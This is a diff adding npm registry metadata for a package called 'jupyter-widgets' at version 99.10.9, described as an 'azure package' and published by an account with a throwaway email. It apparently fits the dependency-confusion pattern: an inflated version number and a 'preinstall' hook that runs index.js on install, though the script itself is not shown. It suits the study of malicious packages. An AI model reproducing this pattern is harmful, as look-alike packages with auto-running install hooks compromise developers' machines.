@@ -1,0 +1,62 @@
+{
+    "_id": "jupyter-widgets",
+    "name": "jupyter-widgets",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "jupyter-widgets",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "jupyter-widgets@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-a/CNzs5HI2qwTUK1geHvmRldlrSmgQ/a++ywKgqc9/drZS3f5O+pmVKSQsMv/SnZ2OyNc53jAO3+QldZRmateg==",
+                "shasum": "9c2d2f3723dc741260f3593d5c9db1c4ccb1b2a3",
+                "tarball": "https://registry.npmjs.org/jupyter-widgets/-/jupyter-widgets-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5067,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiO0crACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmpz1Q/9H18IkvT/8cVjEkofUSytW42zUE0pymAER8GEGbHmn3f+5qd2\r\nnR9Yaog5CMoYm1Aqw4Za75emTdxmuJPwLvTwc7MYNyGOMyUCXTmGir92jjjT\r\nTiUufYOz64O4/Ysj8aNmZqglD0bZg3923Ykuh/f12bAWCTXcez6yGr4uTXIs\r\nxcXvu1Eyv8Ve5SFoqkeL9/S5NsAj6ndCPTCCLK4lOPZoz2FQ5+9VAY6fXJDa\r\nPqm4NlOP7+tr8h1XQIpOlGsF2GMc064+GVEtXWL0dXV9o4kaBgB8MQ01U3uv\r\no7kp6U4zHQkzdQdUJxDoogcVkgGd8l6BFO29GUi7MIlHHLbrtx5csavPNKTN\r\nOlYyHJ20zj5PGlgszTCAwSnnFsg6dxhFZNZtf1HhTl39N6MZ6NHrNDbJDhpy\r\nxAspByCVdPNmTC8o6BpOnDmzzf8Yj+10I5xq2bqu9pOxV497JY1jQyr/lMtj\r\nJdPXyuKkCOv9hdDRnTnPVYdi1+ezIvvNQwQdXQY+Kh1+g2AcfdVHkazff5h/\r\noW3MaomzujVq9t3zkOBOh8er8gSqst2dRTGkDI9X2Sa3za5joMkjrcgpd7PY\r\nPChvyHLZb/wDqD680Nt5V0r5hUNqgZ8YCJQQq1jV4LhhJ+/CnwZErek/oVGn\r\n0F3CHyu36qbeg+7cbov0ixOp9/dXbL2pb9M=\r\n=mHHQ\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "wjv4s320",
+                "email": "wjv4s320@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "wjv4s320",
+                    "email": "wjv4s320@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/jupyter-widgets_99.10.9_1648052011058_0.707536151610016"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-23T16:13:31.058Z",
+        "99.10.9": "2022-03-23T16:13:31.215Z",
+        "modified": "2022-03-23T16:13:31.326Z"
+    },
+    "maintainers": [
+        {
+            "name": "wjv4s320",
+            "email": "wjv4s320@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
